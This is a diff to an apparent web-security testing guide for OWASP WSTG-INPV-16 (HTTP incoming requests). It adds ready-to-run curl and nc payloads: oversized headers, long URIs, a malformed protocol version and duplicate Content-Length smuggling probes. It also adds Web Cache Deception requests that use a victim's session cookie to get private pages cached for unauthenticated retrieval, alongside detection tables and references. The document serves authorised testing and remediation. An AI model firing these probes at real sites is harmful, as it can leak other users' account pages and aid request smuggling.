@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -335,6 +335,51 @@ tester.run_tests()
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Oversized header
+curl -s -o /dev/null -w "%{http_code}\n" "https://{target}/" -H "X-Test: $(python3 -c 'print("A"*16000)')"
+
+# Long URI
+curl -s -o /dev/null -w "%{http_code}\n" "https://{target}/$(python3 -c 'print("A"*8000)')"
+
+# Malformed request line via raw socket
+printf 'GET / HTTP/9.9\r\nHost: {target}\r\n\r\n' | nc {target} 80
+
+# Duplicate Content-Length headers (smuggling precursor)
+printf 'POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 10\r\nContent-Length: 20\r\n\r\n1234567890' | nc {target} 80
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| 8-32KB header value | Oversized header handling | Expect `400`/`413`/`431`; a `200` indicates no limit enforced |
+| 4-16KB URI path | Long URI handling | Expect `414`; a `200` indicates no limit |
+| `HTTP/9.9` version string | Malformed protocol version | Expect `400`/`505`; a `200` is a finding |
+| Duplicate `Content-Length` headers | Ambiguous request framing | Expect `400`; acceptance is a smuggling precursor |
+
+### Web Cache Deception (from PayloadsAllTheThings)
+
+A distinct request-handling flaw from raw protocol abuse above: the cache and the origin server disagree on where a dynamic path ends and a static-looking suffix begins, letting an attacker get a victim's private page cached under a guessable, publicly-fetchable URL.
+
+```bash
+# Path-confusion probe: append a static-looking segment after a private/authenticated path
+curl -s -b "session={victim_session}" "https://{target}/myaccount/home/nonexistent.css"
+# If the cache stores this response keyed by the full URL, a second unauthenticated request
+# for the SAME url returns the victim's cached account page:
+curl -s "https://{target}/myaccount/home/nonexistent.css"
+
+# Delimiter discrepancy: origin treats ';' as a path-segment separator, cache doesn't
+curl -s -b "session={victim_session}" "https://{target}/settings/profile;script.js"
+
+# Path-normalization discrepancy: origin resolves the traversal, cache caches the literal path
+curl -s -b "session={victim_session}" "https://{target}/private/..%2fprofile"
+```
+
+Detection pattern: request the crafted URL twice — once with a valid session (primes the cache) and once with no session/cookies at all. If the second, unauthenticated request returns the first request's private content (and a cache-hit header like `X-Cache: HIT`/`CF-Cache-Status: HIT`), the endpoint is vulnerable to Web Cache Deception (CWE-524). Also check un-keyed inputs (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) for cache poisoning of injected content rather than just page disclosure.
+
+---
+
 ## Remediation
 
 ```nginx
@@ -373,6 +418,13 @@ Timeout 60
 | ----------- | --------------------------------- |
 | **CWE-400** | Uncontrolled Resource Consumption |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-16: Testing for HTTP Incoming Requests](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests)
+- [PayloadsAllTheThings - Web Cache Deception](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception)
 
 ---
 
